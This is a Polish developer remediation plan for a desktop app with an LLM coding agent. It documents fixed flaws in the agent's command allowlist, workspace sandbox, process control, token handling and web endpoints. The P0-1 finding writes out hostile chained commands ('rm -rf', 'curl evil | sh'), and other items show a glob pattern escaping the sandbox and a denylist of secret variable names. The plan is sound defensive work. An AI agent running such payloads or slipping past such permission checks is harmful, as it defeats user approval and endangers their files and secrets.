# Plan naprawy i rozwoju — Grok Desktop

> **Status:** ✅ ZREALIZOWANY (2026-06-04). Wszystkie punkty P0–P3 (M1–M4) wdrożone i oznaczone `[x]`.
> **Kontynuacja → [`PLAN_NAPRAWY_2.md`](PLAN_NAPRAWY_2.md)** (runda 2): niezależny przegląd kodu wykrył
> luki rezydualne tej samej klasy, co już naprawione, ale **nieprzeniesione** w bliźniacze miejsca
> (m.in. kolejka WS agenta vs `chat.py`, atomic write tylko dla `grok_settings.json`, REST fail-open) —
> ID i kamienie (M5–M8) kontynuują ten plan.
> Pierwotnie PROPOZYCJA (2026-06-03) — wynik gruntownej analizy kodu (backend, silnik agenta,
> frontend Electron/React, pakowanie/dokumentacja). Realne ścieżki sieciowe xAI (czat/media/głos/OAuth/
> przebieg agenta) weryfikuje użytkownik z ważnymi poświadczeniami — sandbox blokuje TLS do `api.x.ai`.
> **Powiązane:** [`REBUILD_PLAN.md`](../REBUILD_PLAN.md) (Fazy 0–8), [`MODYFIKACJE.md`](MODYFIKACJE.md) (Voice/Image/Video/załączniki).
> **Cel:** doprowadzić działający prototyp (8 faz + nadbudowa) do jakości produkcyjnej, zaczynając
> od bezpieczeństwa silnika agenta kodowania.

Legenda priorytetów: **P0** = krytyczne (bezpieczeństwo, blokuje zaufanie do agenta) ·
**P1** = wysokie (stabilność/dane) · **P2** = średnie (architektura/jakość/wydajność) ·
**P3** = testy/pakowanie/dokumentacja. Każdy punkt: `plik:linia` → problem → rekomendacja.

---

## Ocena ogólna

Solidny szkielet: czysty handshake port+token, bind tylko `127.0.0.1`, `contextIsolation`,
`nodeIntegration:false`, poprawne ignorowanie sekretów (`.env`, `grok_auth.json` — zweryfikowane),
reużycie dojrzałego rdzenia xAI, dobry `agent_selfcheck.py` (24/24). Główne deficyty układają się
w pięć osi: **(1) bezpieczeństwo agenta, (2) odporność streamingu/WS, (3) obsługa błędów,
(4) trwałość danych, (5) brak testów/CI.**

---

## P0 — Bezpieczeństwo silnika agenta kodowania

To serce aplikacji (LLM ma dostęp do plików i powłoki) — tu naprawiamy najpierw.

### [x] P0-1 — Allowlista „Always allow" obchodzona przez łańcuchowanie komend  🔴 KRYTYCZNE
- **Plik:** `grok_core/agent/permissions.py:48-53`
- **Problem:** klucz dla `run_command` to `"cmd:" + cmd[0]` (sama nazwa programu). Reguła `cmd:git`
  autoryzuje bez pytania `git status && rm -rf ...`, `git; curl evil | sh`, `git $(...)`. Operatory
  `&& ; | $() \`` są dla klucza niewidoczne — jeden klik „Always allow" otwiera wykonanie dowolnego
  payloadu. **Zweryfikowane w kodzie.**
- **Rekomendacja:** nie kluczować po nazwie exe. Preferowane: parsować `shlex`, **odrzucać metaznaki**
  (`& | ; < > $ \` ( ) { } \n`) i uruchamiać bez `shell=True` (argv-lista → łańcuchowanie niemożliwe).
  Wariant minimalny: usunąć „Always allow" dla `run_command` (zawsze pytaj).
- **✅ Zrobione (2026-06-03):** Zaimplementowano świadomy cudzysłowów detektor metaznaków
  `command_metachars()` w `permissions.py` (metaznaki `$ \` \n \r` zawsze; `& | ; < > ( ) { }` poza
  `"..."` — `python -c "print(1)"` i `cd "C:\\Program Files"` przechodzą, łańcuchowanie/podstawianie
  nie). Klucz allowlisty zmieniono z `cmd:<exe>` na **pełną, znormalizowaną komendę** (`cmd:git status`),
  a komendy z metaznakami nie mają klucza (`None`) → `needs_approval=True` i `allow()` ich **nie utrwala**.
  `tools.run_command` **odrzuca metaznaki przed `Popen`** (komunikat naprowadzający model na osobne
  wywołania); `session.py` pomija wtedy dialog i zwraca poprawkę. Świadomie **zachowano `shell=True`**
  (kompatybilność Windows: `npm`/`npx`/`tsc` `.cmd`, builtiny `echo`/`dir`/`cd`) — przy odrzuconych
  metaznakach łańcuchowanie i tak jest niemożliwe. Dodano 19 asercji do `agent_selfcheck.py`
  (`test_command_security`, m.in. „chained payload still asks", „dangerous command not allowlisted",
  „run_command rejects chaining"). **Weryfikacja:** `agent_selfcheck.py` 43/43 OK, `api_smoke.py` OK.

### [x] P0-2 — `glob` całkowicie pomija sandbox  🔴 WYSOKIE
- **Plik:** `grok_core/agent/tools.py:118-123`
- **Problem:** `ws.root.glob(pattern)` nigdy nie przechodzi przez `ws.resolve()`. Wzorzec `../**/*`
  enumeruje pliki **poza** workspace (wyciek struktury FS, m.in. ścieżek do `grok_auth.json`).
  **Zweryfikowane w kodzie.**
- **Rekomendacja:** walidować każdy wynik przez `ws.resolve()` i odrzucać ucieczki; odrzucać wzorce
  zawierające `..` lub komponenty absolutne na wejściu.
- **✅ Zrobione (2026-06-03):** `glob` w `tools.py` odrzuca na wejściu wzorce z `..` oraz absolutne
  (`PurePosixPath`/`PureWindowsPath.is_absolute()` — łapie i `/etc/*`, i `C:\...`), a następnie
  **re-waliduje każdy wynik** przez `ws.resolve(ws.rel(p))` (odrzuca też ucieczki przez symlink).
  Złe wzorce glob łapane (`ValueError`/`OSError`) i raportowane jako `Error: …`. Dodano
  `test_glob_sandbox` do `agent_selfcheck.py` (escape przez `..` i ścieżkę absolutną nie wycieka
  pliku spoza workspace). **Weryfikacja:** `agent_selfcheck.py` 48/48 OK.

### [x] P0-3 — `grep`/`glob`: brak limitu czasu regex → ReDoS / DoS  🔴 WYSOKIE
- **Plik:** `grok_core/agent/tools.py:136,147` (regex), `:143` (wczytanie całego pliku)
- **Problem:** `re.compile`/`rx.search` na wzorcu sterowanym przez model; `(a+)+$` przy n=30 ≈ 90 s
  zajętego rdzenia. Całe pliki ładowane do pamięci (brak limitu rozmiaru; binaria `errors="replace"`).
- **Rekomendacja:** regex w osobnym procesie z wall-clock timeoutem (albo moduł `regex` z `timeout=`);
  pomijać pliki > ~5–10 MB; wykrywać binaria (sniff bajtu NUL) i pomijać.
- **✅ Zrobione (2026-06-03):** `grep` przepięty na moduł **`regex`** z `timeout=` per-search
  (`GREP_SEARCH_TIMEOUT_S=1s`) — przerywa katastrofalny backtracking i zwraca `Error: regex timed
  out …`. Dodatkowo łączny budżet `GREP_TOTAL_TIMEOUT_S=10s` (sprawdzany między plikami i co 500
  linii → wynik częściowy z notką). Pliki **>8 MB** pomijane po `st_size` (bez wczytania), pliki
  **binarne** wykrywane sniffem bajtu NUL (4 KB) i pomijane — z podsumowaniem `[N file(s) skipped]`.
  Wybrano moduł `regex` zamiast osobnego procesu, bo entry-point sidecara nie woła
  `multiprocessing.freeze_support()` → spawn w spakowanym `.exe` byłby footgunem. Dodano
  `regex>=2023.0.0` do `requirements.txt` i jako `hiddenimports` w `grok_core.spec` (import w
  `tools.py` jest w `try/except` z fallbackiem do `re`). Dodano `test_grep_limits` do
  `agent_selfcheck.py` (timeout ReDoS, pominięcie binarnego i wielkiego pliku, zwykłe trafienie).
  **Weryfikacja:** `agent_selfcheck.py` 52/52 OK, `api_smoke.py` OK.

### [x] P0-4 — `run_command` ignoruje Stop; `kill()` nie zabija drzewa  🔴 WYSOKIE
- **Plik:** `grok_core/agent/session.py:120` (`stop_flag=lambda: False`), `grok_core/agent/tools.py:177-218`
- **Problem:** przycisk Stop i rozłączenie WS nie przerywają działającej komendy; `proc.kill()` na
  Windows nie zabija dzieci `cmd.exe`; całe wyjście akumulowane w pamięci przed obcięciem.
- **Rekomendacja:** przekazać `stop` sesji do egzekutora; tree-kill (Job Object / `CREATE_NEW_PROCESS_GROUP`
  + `taskkill /T /F` lub `psutil`); ograniczać akumulację wyjścia w pętli odczytu, nie tylko przy zwrocie.
- **✅ Zrobione (2026-06-03):** (1) **Stop sesji dociera do egzekutora** — `session._handle_tool_call`
  dostaje `stop` z `run_turn` i przekazuje je jako `stop_flag` do `execute_tool` (było
  `lambda: False`). (2) **Tree-kill** — nowy `_tree_kill()` w `tools.py`: Windows `taskkill /T /F
  /PID`, POSIX `os.killpg(SIGKILL)` (Popen z `start_new_session=True`), fallback `proc.kill()`;
  zabija `cmd.exe`/`sh` **wraz z potomkami**. (3) **Wątek-nadzorca** (`_watch_stop`, poll 0.1 s)
  przerywa też komendy „ciche", na których pętla odczytu się blokuje i nie sprawdzałaby Stop;
  szybka ścieżka inline gdy jest wyjście. (4) **Akumulacja wyjścia ograniczana w pętli** do
  `RUN_OUTPUT_CAP=8000` (flaga `truncated`), a nie dopiero przy zwrocie; pipe nadal drenowany, by
  proces nie zakleszczył się na pełnym buforze. Dodano `test_run_command_stop` do
  `agent_selfcheck.py` (Stop ubija `ping`/`sleep` w <5 s zamiast ~9 s). **Weryfikacja:**
  `agent_selfcheck.py` 54/54 OK, brak osieroconego `ping.exe` po teście (tree-kill potwierdzony),
  `api_smoke.py` OK.

### [x] P0-5 — Niedokończone `tool_calls` psują kolejną turę  🔴 WYSOKIE
- **Plik:** `grok_core/agent/session.py:88-92` (Stop w środku batcha), `:94` (max_iters)
- **Problem:** wiadomość `assistant` z N `tool_calls` zostaje bez N odpowiedzi `tool` → następny request
  do xAI zwraca 400 (kontrakt OpenAI/xAI). Korupcja trafia też do `self.history`.
- **Rekomendacja:** przed `return` na Stop/błąd/max_iters dopisać syntetyczny wynik `tool`
  (`"interrupted"`) dla każdego nieobsłużonego `tool_call_id`.
- **✅ Zrobione (2026-06-03):** Przy analizie wyszła **głębsza wada**: wyniki `tool` dopisywane były
  tylko do lokalnej listy `messages`, **nigdy do `self.history`** → historia była niezbalansowana po
  KAŻDEJ turze z narzędziami (nie tylko po Stop), więc kolejna tura groziła 400. Refaktor:
  **`self.history` jest jedynym źródłem prawdy** — `messages` budowane jako `[system] + history` co
  iterację, a wszystkie wiadomości `assistant` i `tool` (też „reject") dopisywane do `history`.
  Dodano `_finalize_interrupted(pending, reason)` dopisujący syntetyczny wynik `tool`
  (`"interrupted"`) dla każdego nieobsłużonego `tool_call_id`; wywoływany przy **Stop w środku
  batcha** oraz przy **wyjątku** w obsłudze narzędzia (`try/except` wokół `_handle_tool_call`). Po
  refaktorze przypadek max_iters jest spójny samoczynnie (wyniki są w historii). Dodano
  `test_interrupted_tool_calls` i `test_history_balanced_after_tools` do `agent_selfcheck.py`.
  **Weryfikacja:** `agent_selfcheck.py` 59/59 OK, `api_smoke.py` OK.

### [x] P0-6 — `run_command` dziedziczy całe środowisko (wyciek tokenów)  🟠 ŚREDNIE
- **Plik:** `grok_core/agent/tools.py:177-183`
- **Problem:** komenda dziedziczy `GROK_CORE_TOKEN`, `XAI_API_KEY` itd.; `set`/`env` wyciąga je do modelu.
- **Rekomendacja:** uruchamiać ze scrubbowanym, minimalnym środowiskiem (usunąć sekrety z `env`).
- **✅ Zrobione (2026-06-03):** Nowy `_scrubbed_env()` w `tools.py` przekazywany do `Popen(env=…)`.
  Denylista (nie minimalny allowlist — żeby nie psuć `cmd.exe`/npm/git wymagających
  PATH/APPDATA/SystemRoot): usuwa jawne `GROK_CORE_TOKEN`/`XAI_API_KEY` oraz każdą zmienną, której
  nazwa zawiera `TOKEN/SECRET/PASSWORD/PASSWD/CREDENTIAL/API_KEY/APIKEY/ACCESS_KEY/PRIVATE_KEY`
  (case-insensitive — łapie m.in. `*_API_KEY`, `AWS_SECRET_ACCESS_KEY`, `GITHUB_TOKEN`). Dodano
  `test_run_command_env_scrub` (bezpośredni scrub + integracyjnie `set`/`env`: sekrety nie wyciekają,
  zwykła zmienna nadal widoczna). **Weryfikacja:** `agent_selfcheck.py` 65/65 OK, `api_smoke.py` OK.

### [x] P0-7 — Zapisy plików nieatomowe; enumeratory idą za symlinkami  🟠 ŚREDNIE
- **Pliki:** `grok_core/agent/tools.py:157,173` (write/edit), `:81-87` (rglob/iterdir)
- **Problem:** `write_text` truncuje na miejscu (pad = utrata pliku); `grep`/`list_dir`/`/fs/tree` idą za
  symlinkami/junctionami wewnątrz workspace → odczyt poza root. Klucz allowlisty `tool:` nie normalizuje
  ścieżki (`src/a.txt` ≠ `./src/a.txt`).
- **Rekomendacja:** zapis temp + `os.replace` (atomowo), opcjonalnie `.bak`; pomijać `is_symlink()`/
  re-walidować `resolve()`; kluczować po `ws.rel(ws.resolve(path))`.
- **✅ Zrobione (2026-06-03):** (1) **Zapis atomowy** — nowy `atomic_write_text()` (temp w tym samym
  katalogu → `flush`+`os.fsync` → `os.replace`); używany przez `write_file`, `edit_file` oraz
  `/fs/write`. Oryginał nigdy nie jest truncowany w miejscu (zachowana translacja newline jak
  `write_text`). (2) **Brak podążania za symlinkami/junctionami** — `_walk_files` przepisany na
  `os.walk(followlinks=False)` + odsiew `_within_root()` (oparte na `resolve()`, więc łapie też
  **junctiony Windows**, których `is_symlink()` nie wykrywa); `list_dir` i `/fs/tree` pomijają wpisy
  wychodzące poza root. (3) **Normalizacja klucza** — `_norm_path()` w `permissions.py`
  (`os.path.normpath` + `/`) → `src/a.txt` == `./src/a.txt` == `src/./a.txt` == `src\a.txt`. Dodano
  testy `test_atomic_write`, `test_symlink_sandbox` (realny junction `mklink /J`), `test_permission_path_norm`.
  **Weryfikacja:** `agent_selfcheck.py` 74/74 OK (junction faktycznie utworzony i odsiany),
  `api_smoke.py` OK.

### [x] P0-8 — Terminal WS = nieautoryzowany shell w trybie standalone  🟠 ŚREDNIE
- **Plik:** `grok_core/routes/terminal.py:23-27`; analogicznie `routes/agent.py:41-45`
- **Problem:** przy pustym `session_token` `_authorized` zwraca `True` → pełna powłoka bez bramki.
- **Rekomendacja:** wymagać tokenu także w standalone (opt-in jawnym flagiem env, nie domyślnie);
  dodać kontrolę `Origin`; nigdy nie logować query stringa z tokenem.
- **✅ Zrobione (2026-06-03):** Wspólny `ws_authorized()` w `state.py` zastąpił cztery zduplikowane,
  fail-open `_authorized` (`chat`, `agent`, `terminal`, `voice`). Teraz **FAIL-CLOSED**: brak
  skonfigurowanego tokenu = ODMOWA, chyba że jawny opt-in `GROK_CORE_ALLOW_NO_TOKEN=1` (świadomy
  dev/standalone). Dodano **kontrolę Origin** (`_ws_origin_ok` przez `urlparse`): dopuszcza brak/
  `null` Origin (klienci natywni), `file://` (Electron prod — `loadFile`) i dowolny host pętli
  zwrotnej (dev renderer na dowolnym porcie); drive-by z zewnętrznej strony (realny host) odrzucony.
  Token porównywany w **czasie stałym** (`secrets.compare_digest` — przy okazji częściowo P1-9 dla
  WS). Tokenów nie logujemy (uvicorn na `log_level="warning"`). Testy w `api_smoke.py`: live
  odrzucenie złego tokenu na `/agent/stream`, `/terminal`, `/voice/realtime` + deterministyczny unit
  `ws_authorized`/`_ws_origin_ok` (fail-closed, opt-in, foreign/loopback/file/null origin).
  **Weryfikacja:** `api_smoke.py` OK (24 asercje), `agent_selfcheck.py` 74/74 OK.

---

## P1 — Electron, streaming, błędy, trwałość danych


### [x] P1-1 — `shell.openPath`/`openExternal` bez walidacji schematu  🟠 ŚREDNIE
- **Plik:** `desktop/src/main/index.ts:258-261`, `:234`
- **Rekomendacja:** dopuszczać tylko `http:`/`https:` dla external; potwierdzać, że cel `openPath` to
  realna ścieżka, nie URL; odrzucać resztę.
- **✅ Zrobione (2026-06-04):** `isSafeExternalUrl()` — `setWindowOpenHandler` przepuszcza do
  `shell.openExternal` **tylko `http:`/`https:`** (inne schematy: `file:`, `javascript:`, własne →
  ignorowane + `console.warn`). `isOpenablePath()` — `shell:openPath` przyjmuje **tylko realne,
  istniejące ścieżki FS**: odrzuca `schemat://` i niebezpieczne schematy (`javascript/data/vbscript/
  file/about/chrome/blob:`) oraz cele nieistniejące (`existsSync`); litera dysku `C:\…` przechodzi
  (nie jest URL-em). **Weryfikacja:** `npm run typecheck` czysty.

### [x] P1-2 — Nadzór sidecara: restart-storm i osierocony proces  🟠 WYSOKIE
- **Plik:** `desktop/src/main/index.ts` (reset `restarts` tylko po `/whoami`; brak timeoutu handshake)
- **Problem:** gdy handshake przejdzie, a `/whoami` padnie → proces żywy w stanie `error` bez recovery;
  brak watchdoga handshake (wisi w `starting`); backoff liniowy kumulowany przez całe życie procesu.
- **Rekomendacja:** reset `restarts` po udanym handshake (lub po N s zdrowia); watchdog handshake (~30 s)
  → kill+restart; na padzie `/whoami` ubić proces (ścieżka restartu) zamiast parkować w `error`;
  na quit `kill()` + fallback SIGKILL + tree-kill (agent spawnuje wnuki).
- **✅ Zrobione (2026-06-04):** (1) **Watchdog handshake** (`HANDSHAKE_TIMEOUT_MS=30s`) — brak linii
  handshake → `killCoreForRestart` (ścieżka restartu); czyszczony po handshake i w `exit`. (2) **`/whoami`
  pada → restart, nie park** — `verifyConnection` próbuje 3× (po 500 ms), a po porażce ubija proces
  (`exit` → restart) zamiast zostawiać w `error`. (3) **Reset `restarts` po N s zdrowia** —
  `scheduleStableReset` (`STABLE_MS=30s` od `ready`), nie natychmiast po `/whoami`; chroni przed
  restart-stormem „handshake-ok/whoami-fail" w pętli (budżet `MAX_RESTARTS` rośnie i w końcu zatrzymuje).
  (4) **Tree-kill** — nowy `treeKill()` (Windows `taskkill /T /F`, POSIX SIGTERM+SIGKILL); na quit
  `stopCore` woła go **synchronicznie** (zabija wnuki agenta, np. `npm`/`ping` z `run_command`), a
  restart/health-fail używa wersji async. Dodano też `before-quit` ustawiające `manualStop` (brak
  restartu w trakcie zamykania). **Weryfikacja:** `npm run typecheck` czysty (main+web). Pełny cykl
  życia (crash/recovery, tree-kill, watchdog) — do potwierdzenia po stronie użytkownika (Electron + xAI).

### [x] P1-3 — Streaming czatu: wyścigi w moście wątek→asyncio  🟠 WYSOKIE
- **Plik:** `grok_core/routes/chat.py:71-121`
- **Problem:** każda ramka `chat` startuje nowy worker na tym samym `out_q`/`stop_event` → przeplot ramek;
  `stop_event.clear()` kasuje Stop poprzedniego; kolejka nieograniczona; wątek nigdy nie `join`-owany;
  wysyłane skumulowane `full` (O(n²) pasma).
- **Rekomendacja:** single-flight worker (odrzucaj/anuluj drugi), `stop_event` per-request, `join` w
  `finally`, wysyłać przyrostową deltę.
- **✅ Zrobione (2026-06-03):** Przepisany most w `chat.py`: (1) **single-flight** — drugi `chat`
  podczas streamingu dostaje błąd „already streaming" (`_busy()`), bez drugiego workera na tej samej
  kolejce; (2) **`stop_event` per-request** (świeży `threading.Event` na worker; `stop` ustawia
  bieżący, nie `clear()` współdzielonego); (3) **kolejka ograniczona** `maxsize=512` + `emit()` z
  backpressure (`run_coroutine_threadsafe(put).result(timeout=30)`; gdy konsument zniknie → `stop`);
  (4) **join workera w `finally`** (w executorze, bez blokowania pętli) + `sender_task.cancel()`;
  (5) **delta przyrostowa** zamiast skumulowanego `full` (O(n²)→O(n) pasma). Front (`lib/api.ts`)
  skleja `delta` lokalnie, więc `onDelta` nadal dostaje pełny tekst — `ChatView` bez zmian. Przy
  okazji owinięto parsowanie `temperature` (por. P1-8). **Bonus:** naprawiono łapanie
  `asyncio.CancelledError` (to `BaseException`, nie `Exception`) przy zamykaniu sendera — wcześniej
  handler rzucałby przy każdym rozłączeniu WS. Dodano `_unit_chat_bridge` w `api_smoke.py` (atrapa WS
  + mock backendu): delty przyrostowe, akumulacja==full, done z full, single-flight.
  **Weryfikacja:** `api_smoke.py` 28/28 OK, `agent_selfcheck.py` 74/74 OK, `npm run typecheck` czysty.
  Realny streaming (UTF-8, Stop w trakcie) — do potwierdzenia po stronie użytkownika z xAI.

### [x] P1-4 — Brak timeoutów na wywołaniach xAI  🟠 WYSOKIE
- **Plik:** `api_manager.py` — `generate_image`, `edit_image*`, `create_video_job`, `edit_video_job`,
  `extend_video_job`, `poll_video_status` (brak `timeout=`; chat/tts/stt mają — niespójność)
- **Problem:** zawieszone połączenie blokuje wątek z puli Starletta → dość takich = zamrożony sidecar.
- **Rekomendacja:** dodać jawny `timeout=` do każdego wywołania `requests`.
- **✅ Zrobione (2026-06-03):** Dodano stałe `TIMEOUT_IMAGE=180`, `TIMEOUT_VIDEO_JOB=120`,
  `TIMEOUT_POLL=30` i jawny `timeout=` do 7 brakujących wywołań (`generate_image`, `edit_image`,
  `edit_image_b64`, `create_video_job`, `edit_video_job`, `extend_video_job`, `poll_video_status`).
  Teraz **wszystkie 13** wywołań `requests` w `api_manager.py` ma timeout (zweryfikowane grepem).
  Dodano regresyjny unit `_unit_api_timeouts` w `api_smoke.py` (atrapa `requests` nagrywająca kwargs;
  11 metod HTTP, każda musi mieć `timeout != None`). **Weryfikacja:** `api_smoke.py` 24/24 OK.

### [x] P1-5 — Klienci WebSocket bez reconnectu i sprzątania  🟠 WYSOKIE
- **Pliki:** `desktop/src/renderer/src/lib/agentClient.ts`, `lib/realtime.ts`,
  `components/code/Terminal.tsx`, `lib/api.ts:301` (`streamChat`)
- **Problem:** żaden nie reconnectuje po `onclose`/`onerror`; po restarcie sidecara wszystkie WS cicho
  umierają (`Terminal` ma deps `[]` → nie wstaje). `streamChat` nie zamyka socketu na błędzie (leak);
  `AgentConnection` bez `onerror`; brak cleanup w `useEffect`.
- **Rekomendacja:** backoff-reconnect, `onclose`/`onerror` zamykające socket, cleanup zamykający stream
  przy unmount; kluczować efekt Terminala na `[conn.baseUrl, conn.token]`.
- **✅ Zrobione (2026-06-04):** (1) **`AgentConnection`** przepisana: `connect()` + **auto-reconnect z
  backoffem** (1→8 s, cap) po nieoczekiwanym `onclose`; `onerror` zamyka socket; flaga `closed` w
  `close()` wstrzymuje reconnect (a `AgentPanel` i tak kluczuje na `[conn.baseUrl, conn.token]` i woła
  `close()` w cleanup). (2) **`streamChat`** (one-shot — bez reconnectu): `onerror` zamyka socket
  (koniec leaka) + `onclose` przed `done` → `onError` (zamiast cichego zawisu); guard `finished` przeciw
  podwójnym callbackom. (3) **`Terminal`**: deps `[]` → **`[conn.baseUrl, conn.token]`** (wstaje po
  restarcie sidecara), `onerror` zamyka socket, `onclose` pisze „[terminal disconnected]" (z flagą
  `cleanup`, by nie pisać do disposed-terminala). (4) **`realtime`**: `onerror` zamyka socket (→ `onclose`
  → `stopMic`); pełny cleanup już był w `RealtimeSession.stop()` (wołany w cleanup `Voice`). Reconnect
  świadomie pominięty dla czatu (one-shot) i głosu (stan audio). **Weryfikacja:** `npm run typecheck` czysty.

### [x] P1-6 — Wszechobecne „połykanie" błędów (także fałszywy sukces)  🟠 WYSOKIE
- **Pliki:** `grok_core/state.py:69-89`, `oauth_manager.py:107`, `chats_manager.py:35`,
  `history_manager.py:19` (bare `except:`); frontend `components/Settings.tsx:94`, `CodeView.tsx`
- **Problem:** zapisy ustawień/auth/chatów: `except Exception: pass`; `read_settings` zwraca `{}` przy
  uszkodzonym JSON (ciche skasowanie ustawień); zero `logging`. Frontend pokazuje „API key saved."
  niezależnie od wyniku. `HTTPException(detail=str(exc))` przekazuje surowy tekst błędu xAI do renderera.
- **Rekomendacja:** `logging` po stronie serwera (stderr — stdout zarezerwowany na handshake);
  nie pokazywać sukcesu po połkniętym wyjątku; toasty błędów; sanityzować `detail` (logować surowe,
  zwracać ogólny komunikat).
- **✅ Zrobione (2026-06-04):** (1) **Logging na stderr** — `__main__.py` `logging.basicConfig(stream=
  sys.stderr)` (stdout czysty dla handshake); moduły używają `logging.getLogger(__name__)`. (2)
  **`state.read_settings`** przy uszkodzonym JSON: loguje i **archiwizuje** plik do `.corrupt`
  (zamiast cicho zwracać `{}` i nadpisać). (3) **`state.write_settings`** zapis atomowy (temp+
  `os.replace`) i **propaguje błąd** → trasa `/settings` nie zgłasza fałszywego sukcesu;
  `_record_recent` łapie+loguje (niekrytyczne). (4) **Sanityzacja błędów xAI** — nowy
  `grok_core/errors.py::upstream_error` (loguje surowy wyjątek, zwraca ogólny `detail`); użyty w
  `media.py` (6×) i `voice.py` (2×) zamiast `detail=str(exc)`. (5) **Root-managery** `chats_manager`/
  `history_manager`: logger + log zamiast `except: pass` (też naprawiony bare `except:`). (6) **Front**:
  `Settings.tsx` (`saveKey`/`browse`/`saveModels`) pokazuje realny wynik (błąd zamiast „saved" po
  porażce); `CodeView.selectWorkspace` loguje błąd zamiast cichego połknięcia. **Weryfikacja:**
  `api_smoke.py` 28/28, `agent_selfcheck.py` 74/74, `npm run typecheck` czysty.

### [x] P1-7 — Trwałość danych: localStorage i nieatomowe JSON-y  🟠 WYSOKIE
- **Pliki:** `desktop/src/renderer/src/components/ChatView.tsx:123`, `lib/storage.ts:31`;
  `grok_core/state.py:77`, `chats_manager.py:35`, `history_manager.py:38`
- **Problem:** zapis całej listy rozmów na każdą deltę; obrazy base64 w wiadomościach → przekroczenie
  ~5 MB; `QuotaExceededError` połykany (cicha utrata). Współdzielone JSON-y bez atomowego zapisu/blokad
  (nowa apka + legacy) → ryzyko korupcji; `grok_config.json` przepisywany w całości.
- **Rekomendacja:** debounce zapisu (na koniec streamu/idle), nie persystować base64 (referencja/miniatura
  lub backendowy ChatStore/IndexedDB), pokazywać błąd quota; `os.replace` z temp + blokada międzyprocesowa.
- **✅ Zrobione (2026-06-04):** **Front:** (1) `ChatView` — zapis rozmów **debounce 800 ms** (nie na
  każdą deltę, tylko po wyciszeniu streamu); na błąd zapisu pokazuje błąd w UI. (2) `storage.ts` —
  `saveConversations` **strippuje base64** (usuwa `attachments[].uri/text`, zostaje id/name/kind →
  historia lekka) i **zwraca bool** + `console.error` zamiast cichego połknięcia `QuotaExceededError`.
  **Backend:** (3) nowy `config.atomic_write_text()` (temp + `os.replace`) — używany przez
  `chats_manager._save`, `history_manager._persist` i `state.write_settings`; czytelnik widzi zawsze
  kompletny plik (brak korupcji przy przerwanym zapisie, też dla współdzielonych z legacy).
  **Świadomie odłożone:** pełna **blokada międzyprocesowa** (nowa apka + legacy piszące jednocześnie)
  — `os.replace` eliminuje KORUPCJĘ; pozostaje rzadki „lost update" przy równoległym pisaniu tego
  samego pliku przez obie apki. Wymagałby zależności/locka per-platforma; do zrobienia osobno.
  **Weryfikacja:** `api_smoke.py` 28/28, `agent_selfcheck.py` 74/74, `npm run typecheck` czysty.

### [x] P1-8 — Walidacja wejścia tras  🟠 ŚREDNIE
- **Pliki:** `grok_core/routes/media.py:21,27-56`, `voice.py:31-41`, `chat.py:120` (`float(temperature)`)
- **Problem:** brak ograniczeń (`n` obrazów, rozmiar base64, `duration`); zły `temperature` z WS rzuca
  `ValueError` i wywraca pętlę odbioru.
- **Rekomendacja:** `Field(ge=, le=, max_length=)` w Pydantic; walidować data-URI (schemat+rozmiar);
  owinąć parsowanie `temperature`.
- **✅ Zrobione (2026-06-04):** Nowy `grok_core/validation.py` (limity + walidatory data-URI). Modele
  `media.py` dostały `Field`: `prompt` min/max (8000), `n` `ge=1/le=10`, `duration` `ge=1/le=30`
  (extend `le=10`), `images` lista `le=8`, `aspect_ratio`/`resolution`/`model` `max_length`; pola
  obrazów (`images`, `image`) i wideo (`video`) mają `field_validator` — obrazy muszą być
  `data:image/*;base64` w limicie rozmiaru, wideo to `https://` lub `data:video/*;base64`.
  `voice.py`: `text`/`audio_b64`/`filename`/`language` z limitami (TTS tekst 8000, audio ~22 MB).
  Naruszenie → automatyczne **422** zamiast 500/OOM. `chat.py` parsowanie `temperature` owinięte już
  przy P1-3 (`try/except → 0.7`, nie wywraca pętli odbioru WS). Dodano `_unit_input_validation` do
  `api_smoke.py` (7 asercji: poprawne przechodzi; n/prompt/data-URI/liczba obrazów/duration/TTS
  odrzucane). **Weryfikacja:** `api_smoke.py` 35/35 OK.

### [x] P1-9 — CORS `*` i porównanie tokenu nie-constant-time  🟡 ŚREDNIE
- **Plik:** `grok_core/server.py:74-80`, `state.py:175`, `routes/chat.py:39`, `voice.py:79`
- **Rekomendacja:** zawęzić `allow_origins` do `http://localhost:5173` + schemat spakowany;
  `secrets.compare_digest` do porównań tokenu.
- **✅ Zrobione (2026-06-04):** CORS w `server.py` zawężony z `["*"]` do `allow_origins=["null"]`
  (spakowany Electron `file://`) + `allow_origin_regex=^http://(localhost|127.0.0.1)(:\d+)?$` (dev
  renderer, dowolny port); obcy origin (drive-by) odcięty. `state.require_token` używa
  `secrets.compare_digest` (czas stały) zamiast `!=`. Porównania WS (`chat.py`, `voice.py`,
  `agent.py`, `terminal.py`) już używają `compare_digest` przez wspólny `ws_authorized` (P0-8).
  Dodano w `api_smoke.py` testy CORS (dozwolony loopback i `null`, odcięty obcy origin).
  **Weryfikacja:** `api_smoke.py` 38/38 OK (w tym CORS + 401/403 tokenu), `agent_selfcheck.py` 74/74 OK.

---

## P2 — Architektura, jakość, wydajność

### [x] P2-1 — Brak React error boundary  🟠 WYSOKIE
- **Plik:** `desktop/src/renderer/src/main.tsx:17-23` — throw w renderze = białe okno bez recovery.
- **Rekomendacja:** owinąć `<App/>` (i każdy moduł) w error boundary z fallbackiem + reload.
- **✅ Zrobione (2026-06-04):** Nowy `components/ErrorBoundary.tsx` (klasa — boundary muszą być klasami):
  `getDerivedStateFromError` + `componentDidCatch` (loguje `error` + `componentStack` do konsoli
  renderera), fallback z **„Try again"** (reset stanu boundary) i **„Reload app"**
  (`window.location.reload()`). Prop `resetKeys` → `componentDidUpdate` czyści błąd, gdy zmienia się
  klucz (przełączenie modułu odzyskuje zcrashowany). Wpięte **dwupoziomowo:** (1) `main.tsx` owija
  `<App/>` (top-level — fallback pełnoekranowy `h-screen` z `bg-bg`); (2) `App.renderModule` owija
  aktywny moduł w `<ErrorBoundary label={active} resetKeys={[active]}>` (crash modułu zostawia rail/
  nawigację sprawną — fallback tylko w obszarze treści, „<Moduł> crashed"). Switch modułów wydzielony
  do czystej funkcji `moduleFor()`. **Weryfikacja:** `npm run typecheck` czysty (main+web); podgląd
  web (`renderer-preview` :4599) — boot bez błędów konsoli; smoke-test throw potwierdził: top-level
  łapie crash App (pełny ekran), per-moduł izoluje crash (rail sprawny, „Chat crashed"), a
  przełączenie na inny moduł resetuje boundary (CodeView wstał). Throwy testowe cofnięte.

### [x] P2-2 — Stan serwera bez cache (zustand/react-query nieużywane)  🟡 ŚREDNIE
- **Problem:** `/models` pobierane 6× niezależnie (ChatView/CodeView/Image/Video/Voice/Settings).
